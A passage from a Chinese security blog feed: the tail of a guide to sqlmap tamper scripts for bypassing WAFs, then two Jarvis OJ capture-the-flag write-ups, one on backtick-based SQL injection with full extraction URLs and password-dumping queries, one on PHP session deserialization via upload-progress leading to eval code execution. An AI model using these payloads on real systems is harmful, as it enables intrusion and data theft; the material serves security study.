title="space2hash.py"></a>space2hash.py</h2><p>和上面类似，不过这儿是用#注释符</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="space2morecomment-py"><a href="#space2morecomment-py" class="headerlink" title="space2morecomment.py"></a>space2morecomment.py</h2><p>将空格用 /<strong>_</strong>/ 替代</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h2><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote><p>space2hash.py： union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A1,2–+</p><p>space2morehash.py：union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h2 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h2><blockquote><p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%01select%021,2–+</p></blockquote><p><strong>适用数据库：</strong>SQL Server</p><h2 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py"></a>space2mssqlhash.py</h2><p>用 # 加一个换行符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23%0Aselect%23%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MSSQL、MySQL</p><h2 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h2><blockquote><p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p></blockquote><p>用这些随机空白符替换payload中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0D1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h2><p>用 – 加一个换行符替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union–%0Aselect–%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL、MSSQL</p><h2 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h2><p>用 + 替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union+select+1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h2><blockquote><p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0C1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h2><blockquote><p>retVal = re.sub(r”(?i)bANDb”, “%26%26”, re.sub(r”(?i)bORb”, “%7C%7C”, payload))</p></blockquote><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote><p>1 and 1=1 <strong>to</strong> 1 %26%26 1=1</p><p>1 or 1=1 <strong>to</strong> 1 %7c%7c 1=1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h2><blockquote><p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p></blockquote><p>用 union select 替换union all select</p><blockquote><p>union all select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h2><p>用宽字符绕过 GPC addslashes</p><blockquote><p>1‘ and 1=1 <strong>to</strong> 1%df%27 and 1=1–</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h2><p>将 payload 大写</p><blockquote><p>union select <strong>to</strong> UNION SELECT</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h2><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p></blockquote><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h2><p>对不是函数的关键字进行注释</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h2><p>注释每个关键字</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURREN**T_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h2 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h2><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p></blockquote><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;apostrophemask-py&quot;&gt;&lt;a href=&quot;#apostrophemask-py&quot; class=&quot;headerlink&quot; title=&quot;apostrophemask.py&quot;&gt;&lt;/a&gt;apostrophemask.py&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ inject</title>
    <link href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/"/>
    <id>https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</id>
    <published>2019-02-26T09:56:10.000Z</published>
    <updated>2019-04-02T15:39:57.491Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><h3 id="得到源码"><a href="#得到源码" class="headerlink" title="得到源码"></a>得到源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    $table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    $table = Filter($table);</span><br><span class="line">    mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    $sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    $ret = sql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>?table=flag 正常响应<br>==&gt; <strong>存在 secret_flag 表</strong><br>注意到这个反引号 ``，其作用是区分 MySQL 保留字与普通字符</p><p>本地尝试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span>  <span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span>  <span class="comment"># 能成功执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> <span class="string">`abc`</span> <span class="string">`def`</span></span><br><span class="line"><span class="keyword">desc</span> abc <span class="keyword">def</span> </span><br><span class="line"><span class="comment"># 效果是一样的</span></span><br></pre></td></tr></table></figure><p>结合题目 ==&gt; desc `secret_flag` `<br>（注意空格，此处如果是 desc `secret_flag`` 将被认为是执行 desc secret_flag`）</p><p>顺手执行</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span></span><br></pre></td></tr></table></figure><p>发现还是没有变化，依旧显示 flag{xxx}<br>不要灰心，这只显示了一条数据而已，加入 limit 试试</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>==&gt; 1</p><h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`%<span class="number">20</span>`%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span></span><br><span class="line">where%<span class="number">20</span>table_name=<span class="number">0x7365637265745f666c6167</span>%<span class="number">20</span>limit%<span class="number">201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p> ==&gt; flagUwillNeverKnow<br>(如果 <code>“</code> 被过滤，此处 table_name 的值要进行 hex 编码）</p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>flagUwillNeverKnow<span class="symbol">%20</span>from<span class="symbol">%20</span>secret_flag<span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>PS：也可以不用 limit，直接 where 0，使得前面的查询为空，则直接显示我们的数据<br>table=flag<code>%20</code>%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag</p></blockquote><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><p><strong>information_schema</strong> 存储数据库信息的数据库</p><blockquote><p><strong>数据库名</strong></p><p>schemata =&gt; schema_name</p><p>tables =&gt; table_schema</p><p>columns =&gt; table_schema</p><p><strong>表名</strong></p><p>tables =&gt; table_name</p><p>columns =&gt; table_name</p><p><strong>列名</strong></p><p>columns =&gt; columns_name</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获得所有列名（字段）</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"flag"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取表中的字段名</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://web.jarvisoj.com:32794/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://web.jarvisoj.com:32794/index.php&lt;/a&gt;~&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ phpinfo</title>
    <link href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/"/>
    <id>https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/</id>
    <published>2019-02-25T12:42:29.000Z</published>
    <updated>2019-10-13T11:49:46.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从-session-角度学习反序列化"><a href="#从-session-角度学习反序列化" class="headerlink" title="从 session 角度学习反序列化"></a>从 session 角度学习反序列化</h1><p>下面是题目给出的源码  <a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">原题链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mdzz;</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">$m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目直接给出了 <code>phpinfo</code> 信息，作为 CTF 的题来说，一定有其特别的意义。</p><p>另外，在实战中也是重要的信息泄露，不熟悉的同学可参考 <a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/" target="_blank" rel="noopener">phpinfo 可以告诉我们什么</a>。</p><p>遇到这种情况，可直接拿下来与默认的 <code>phpinfo</code> 进行文件对比，或许可以迅速找到突破口。</p><h3 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h3><p>看到 <code>__construct()</code> 和 <code>__destruct()</code> 两个魔术方法，极有可能是反序列化的题。其中，<code>__destruct()</code> 中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br></pre></td></tr></table></figure><p>如果 <code>$this-&gt;mdzz</code> 可控的话，这就是一个明显的 <code>webshell</code> 了，可惜 <code>mdzz</code> 在构造函数中就限死了，而且这里并没有变量覆盖的漏洞，否则也可以打一波，陷入困境。</p><p>有这么方便的 <code>eval()</code> 在这里，能不能绕过构造函数，直接执行我们需要的命令呢？</p><p>此处必有蹊跷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>1.<a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md" target="_blank" rel="noopener">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></strong></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g5use1fv7vj20jy02owel.jpg" alt></p><p><code>phpinfo</code> 中可以看到，PHP 反序列化时可以使用的几种方法。</p><p>平时实验过程中，也可以用这个语句进行方法指定。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start([</span><br><span class="line">    <span class="string">'serialize_handler'</span> =&gt; <span class="string">'php_serialize'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>在设置 session 和读取 session 两个阶段中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'test'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">存储时使用 php_serialize --&gt; </span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br><span class="line"></span><br><span class="line">反序列化使用 php --&gt; </span><br><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">[<span class="string">"a:1:&#123;s:4:"</span>test<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成”键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。</p></blockquote><p>然而到这里还是没解决 <code>mdzz</code> 不可控的问题，接下来引入第二个知识点。</p><p><strong>2.上传进度支持（Upload progress in sessions）</strong></p><p>正常用法参见 <a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">example #1</a>，配合 Ajax 就能显示上传进度。</p><p>利用此法可达到对 <code>session</code> 写入数据的效果，从而使得 <code>$mdzz</code> 可控，可参照 <a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">有趣的 php 反序列化总结</a></p><blockquote><p>当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $_SESSION 中添加一组数据，所以可通过 session.upload_progress 来设置 <code>session</code>。</p></blockquote><p>下面是部分参数说明</p><blockquote><p>session.upload_progress.enabled[=1] : 是否启用上传进度报告(默认开启)<br>session.upload_progress.cleanup[=1] : 是否在上传完成后及时删除进度数据(默认开启, 推荐开启).<br>session.upload_progress.prefix[=upload_progress_] : 进度数据将存储在<br>_SESSION[session.upload_progress.prefix . _POST[session.upload_progress.name]]<br>session.upload_progress.name[=PHP_SESSION_UPLOAD_PROGRESS] :<br>如果 _POST[session.upload_progress.name]没有被设置, 则不会报告进度.<br>session.upload_progress.freq[=1%] : 更新进度的频率(已经处理的字节数), 也支持百分比表示’%’.<br>session.upload_progress.min_freq[=1.0] : 更新进度的时间间隔(秒级)</p></blockquote><p>回到本题，查看 <code>phpinfo</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.enabled</span> = <span class="number">1</span></span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.cleanup</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>即使 cleanup 开启了也问题不大，可利用持续上传进行条件竞争。</p><h3 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h3><p><strong>构造一个表单</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"2333"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果不指定，PHP 将默认使用 “php“ 作为 session 序列化的方法，payload 及结果如下：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g5usdf3ce7j20z00h7429.jpg" alt></p><p>PS：不用纠结 <code>Content-Type</code>，这个对解题没有影响，重点是加入<code>\</code>，防止 <code>&quot;</code> 被转义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:19:\"print_r($_SESSION);\";&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">[a:<span class="number">1</span>:&#123;s:<span class="number">24</span>:<span class="string">"upload_progress_12312131"</span>;a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1551019950</span>;s:<span class="number">14</span>:<span class="string">"content_length"</span>;i:<span class="number">434</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">434</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;</span><br><span class="line"> a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">"field_name"</span>;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">55</span>:<span class="string">"] </span></span><br><span class="line"><span class="string">=&gt; OowoO Object(</span></span><br><span class="line"><span class="string">[mdzz] =&gt; print_r($_SESSION);</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure><p>根据 php 手册，存入 <code>session</code> 里的形式是这样的，由此看出 <code>field_name</code> 也可，所以不一定要用 <code>filename</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"><span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              </span><br><span class="line">    <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"><span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line"><span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line"><span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line"><span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line"><span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">            <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>, </span><br><span class="line">            <span class="comment">// When 